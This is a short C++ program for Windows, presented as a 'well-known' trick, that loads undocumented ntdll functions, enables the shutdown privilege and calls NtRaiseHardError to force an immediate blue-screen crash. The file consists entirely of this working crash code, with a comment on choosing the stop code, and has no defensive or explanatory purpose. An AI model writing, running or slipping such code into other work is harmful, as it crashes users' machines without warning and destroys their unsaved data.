// wellknown one

#include <iostream>
#include <Windows.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

typedef  NTSTATUS (NTAPI *_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);

typedef NTSTATUS(NTAPI* _NtRaiseHardError)(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, 
	PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

#define SeShutDownPrivilage 19

void bsod()
{
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	BOOLEAN OldValue;

	ULONG Respone;

	if (ntdll != nullptr) {

		_RtlAdjustPrivilege RtlAdjustPrivilege = (_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");

		_NtRaiseHardError NtRaiseHardError = (_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");

		// Enable SeShutDownPrivilage 

		RtlAdjustPrivilege(SeShutDownPrivilage, true, false, &OldValue);

    // ErrorStatus Can Be Any Value U Don't Have To Put STATUS_ASSERTION_FAILURE it will just be the stop code that appears during the bsod 
    
		NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, nullptr, 6, &Respone);
	}
}

int main()
{
	bsod();
	return 0;
}
